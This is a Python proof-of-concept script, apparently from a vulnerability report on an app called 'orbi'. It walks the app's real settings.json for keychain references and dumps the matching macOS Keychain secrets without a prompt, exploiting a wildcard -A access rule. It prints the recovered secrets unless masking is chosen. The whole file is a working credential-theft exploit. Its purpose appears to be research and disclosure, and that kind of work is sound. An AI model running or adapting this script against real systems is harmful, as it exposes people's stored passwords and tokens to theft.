#!/usr/bin/env python3
"""LIVE PoC 4 — read the real macOS Keychain secrets of a configured instance.

Use: python3 poc4_live_keychain_dump.py --confirm [--mask]

Reads the real settings.json, collects every ``keychain:<acct>`` reference, and
calls the real ``security find-generic-password`` for each (no prompt because the
items were written with -A). Prints the recovered secrets. Use --mask to hide
their values while still proving each one is readable.
"""
import argparse
import json
import re

from live_common import (confirm_arg, data_arg, load_orbi,
                         orbi_arg, real_data_dir, require_confirm)

TOKEN = re.compile(r"^keychain:([0-9a-f]+)$")


def walk(obj, path=""):
    if isinstance(obj, dict):
        for k, v in obj.items():
            yield from walk(v, f"{path}.{k}" if path else k)
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            yield from walk(v, f"{path}[{i}]")
    elif isinstance(obj, str):
        m = TOKEN.match(obj)
        if m:
            yield path, m.group(1)


def main():
    ap = argparse.ArgumentParser()
    orbi_arg(ap)
    data_arg(ap)
    ap.add_argument("--mask", action="store_true", help="do not print secret values")
    confirm_arg(ap, "read the real Keychain secrets referenced by settings.json")
    args = ap.parse_args()
    require_confirm(args)
    root = load_orbi(args)
    data_dir = real_data_dir(args, root)
    settings_file = data_dir / "settings.json"
    if not settings_file.is_file():
        raise SystemExit(f"[!] No settings.json in {data_dir}; pass --data-dir")

    from orbi import osdep
    data = json.loads(settings_file.read_text("utf-8"))
    refs = list(walk(data))
    if not refs:
        print("[!] no keychain: references in settings.json — instance has no stored secrets")
        return 2
    print(f"[*] settings: {settings_file}")
    print(f"[*] found {len(refs)} keychain references")
    for path, acct in refs:
        try:
            value = osdep.unprotect(f"keychain:{acct}")
        except OSError as e:
            print(f"[-] {path}: read failed: {e}")
            continue
        shown = f"<{len(value)} chars hidden>" if args.mask else value
        print(f"[+] {path} (acct {acct[:8]}...): {shown}")
    print("[+] CONFIRMED: secrets readable with no Keychain prompt (wildcard -A ACL)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
